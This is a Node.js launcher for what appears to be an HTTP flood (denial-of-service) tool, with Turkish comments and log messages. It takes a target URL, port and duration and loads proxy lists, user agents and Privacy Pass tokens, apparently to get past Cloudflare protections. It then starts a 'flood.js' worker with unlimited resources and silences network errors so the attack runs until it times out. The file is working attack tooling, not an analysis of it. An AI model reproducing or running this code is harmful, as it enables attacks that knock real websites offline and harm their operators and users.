const {
    Worker
} = require('worker_threads'),
    fs = require('fs'),
    events = require('events');

process.setMaxListeners(0);
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

var log = console.log;
global.logger = function () {
    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
};

let SETTINGS = {
    proxies: [],
    browsers: {},
    privacypass: [],
    userAgents: [],
    referers: []
}

function loadPrivacypass() {
    try {
        SETTINGS.privacypass = JSON.parse(fs.readFileSync('./privacypass.json', 'utf-8'));
    } catch (e) {
        logger('[ERROR] privacypass.json okunamadı');
    }
}

if (fs.existsSync('./privacypass.json')) {
    loadPrivacypass();
}

setInterval(() => {
    loadPrivacypass();
}, 400e3);

// Global hata yakalayıcı
let ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError'],
    ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT'];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
});

// 🌐 Doğrudan parametre ile başlatma
if (!process.env.__daemon && process.argv.length >= 5) {
    const target = process.argv[2];
    const port = parseInt(process.argv[3]);
    const duration = parseInt(process.argv[4]);

    logger(`[MANUAL MODE] Target: ${target}, Port: ${port}, Duration: ${duration}s`);

    try {
        SETTINGS.proxies = fs.readFileSync('./proxies.txt', 'utf-8').split('\n').filter(Boolean);
        SETTINGS.userAgents = fs.readFileSync('./useragents.txt', 'utf-8').split('\n').filter(Boolean);
    } catch (err) {
        logger('[HATA] proxies.txt veya useragents.txt eksik.');
        process.exit(1);
    }

    let newATKobj = {
        target: target,
        duration: duration * 1000
    }

    newATKobj.proc = new Worker('./flood.js', {
        workerData: {
            target: target,
            proxies: SETTINGS.proxies,
            userAgents: SETTINGS.userAgents,
            referers: SETTINGS.referers,
            duration: duration * 1000,
            opt: false,
            mode: 'proxy'
        },
        resourceLimits: {
            maxOldGenerationSizeMb: Infinity,
            maxYoungGenerationSizeMb: Infinity,
            codeRangeSizeMb: Infinity
        }
    });

    setTimeout(() => {
        logger('[INFO] Saldırı süresi doldu, çıkılıyor.');
        newATKobj.proc.terminate();
        process.exit(0);
    }, duration * 1000 + 3000);
} else {
    logger("[KULLANIM] node client.js <url> <port> <süre>");
}
